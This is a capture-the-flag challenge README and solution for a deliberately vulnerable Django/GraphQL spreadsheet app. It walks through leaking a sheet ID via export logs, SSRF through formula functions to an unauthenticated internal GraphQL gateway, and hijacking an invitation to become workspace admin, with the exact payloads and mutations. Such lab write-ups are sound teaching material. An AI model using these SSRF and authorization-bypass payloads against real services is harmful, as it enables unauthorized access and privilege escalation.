# H7Tex

**Category:** web

A Django + GraphQL spreadsheet app with a React frontend. Run: `cd h7tex && docker compose up --build` (nginx on port 80). Players log in as `gotret` / `getrek`. `h7tex.zip` is the same tree zipped.

## Solution

The chat has three messages from our manager, and each one is a hint:

- our access to the `synchgrid` workspace was denied,
- the intern `cookie@synchgrid.com` was just given access to `Financials Q4`,
- the formula engine is "temporarily" hooked up to `internal-graphql` on port 8000.

So the target is the `Financials Q4` sheet in `synchgrid`. Its `flag` field only resolves for workspace admins.

**1. Leak the sheet ID.** Cells accept references like `=['Financials Q4']`. Put that in one of our own sheets and hit `/export/<our workspace id>`. The zip contains `export_log.json`, which helpfully resolves the reference to `referenced_doc_id`, the UUID of the real sheet.

**2. SSRF to the internal gateway.** `=IMPORT_CSV("...")` (also `FETCH_URL`, `GET_DATA`) makes the backend fetch a URL and puts the response in `evaluatedContent`. The internal endpoint has no auth:

```
=IMPORT_CSV("http://backend:8000/internal-graphql?query={spreadsheetById(id:\"<sheet id>\"){workspace{id owner{email}}}}")
```

That gives the synchgrid workspace ID.

**3. Hijack an invitation.** `inviteUser` checks membership before it checks that we're admin. If the email already belongs to a member, it errors out with the original invitation ID:

```graphql
mutation { inviteUser(workspaceId: "<synchgrid id>", email: "cookie@synchgrid.com", role: "VIEWER") { invitation { id } } }
# "User is already a member. Original invitation ID: ..."
```

`updateInvitation` has no auth check at all and creates a fresh pending invite from any existing one, with whatever role and email we give it:

```graphql
mutation { updateInvitation(invitationId: "<leaked id>", newRole: "ADMIN", newEmail: "<our email>") { newInvitation { id } } }
mutation { acceptInvitation(invitationId: "<new id>") { workspaceMembership { workspace { name } } } }
```

**4. Read the flag.** We're now admin of synchgrid:

```graphql
{ spreadsheetById(id: "<sheet id>") { flag } }
```

`h7tex/test.sh` runs the whole chain from a fresh account; `h7tex/leak.sh` is just step 3.

Flag is per-instance: `H7Tex{<16 hex>}`
